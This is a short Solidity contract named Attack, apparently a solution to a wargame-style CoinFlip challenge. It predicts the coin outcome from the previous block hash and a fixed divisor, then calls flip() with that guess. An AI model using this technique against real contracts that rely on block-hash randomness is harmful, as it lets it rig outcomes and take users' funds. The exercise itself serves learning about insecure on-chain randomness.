// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract Attack {
    CoinFlip immutable coinFlip;
    uint256 private immutable _FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip coinFlip_) {
        coinFlip = coinFlip_;
    }

    function attack() public returns (bool succ) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        bool side = blockValue / _FACTOR == 1 ? true : false;
        succ = coinFlip.flip(side);
        assert(succ);
    }
}
